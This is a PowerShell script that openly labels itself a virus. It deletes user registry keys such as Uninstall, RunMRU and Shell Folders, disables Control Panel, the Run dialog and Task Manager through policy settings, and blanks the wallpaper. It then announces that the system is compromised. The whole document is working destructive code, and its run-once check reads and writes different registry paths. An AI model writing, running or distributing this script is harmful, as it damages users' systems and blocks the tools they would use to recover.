# Check if the virus has already been run
$virusEnabled = Get-ItemProperty -Path "HKCU:\Software\VirusStatus" -Name "VirusEnabled" -ErrorAction SilentlyContinue

if ($virusEnabled -eq $null) {
    # First-time execution: enable the virus
    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "ON"
} else {
    # Virus has already been executed before; close itself
    Write-Host "Virus already executed. Exiting..." -ForegroundColor Red
    exit
}

# Start virus execution
try {
    Write-Host "This is virus" -ForegroundColor Red
    Start-Sleep -Seconds 3

    # Remove non-essential registry keys
    $nonEssentialRegistryKeys = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall",     # Uninstall keys
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", # Recent commands
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", # Shell folders
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" # Explorer advanced settings
    )

    foreach ($key in $nonEssentialRegistryKeys) {
        if (Test-Path $key) {
            Remove-Item -Path $key -Recurse -Force
            Write-Host "Removed registry: $key" -ForegroundColor Yellow
        }
    }

    # Disable certain system features by removing entries in registry
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoControlPanel" -Value 1 -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Force

    # Change background to black
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value ""
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

    # Disable Task Manager (classic method)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force

    # Wait and display a message
    Start-Sleep -Seconds 2
    Write-Host "Virus executed successfully! Your system is compromised." -ForegroundColor Red

    # Indicate that the virus should not run again
    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "OFF"

} catch {
    Write-Host "Error occurred. Retrying..." -ForegroundColor Red
    # If any error occurs, retreat the virus and exit gracefully
    Set-ItemProperty -Path "HKCU:\Software" -Name "VirusEnabled" -Value "OFF"
    exit
}

# After execution, the virus "disables" itself
exit
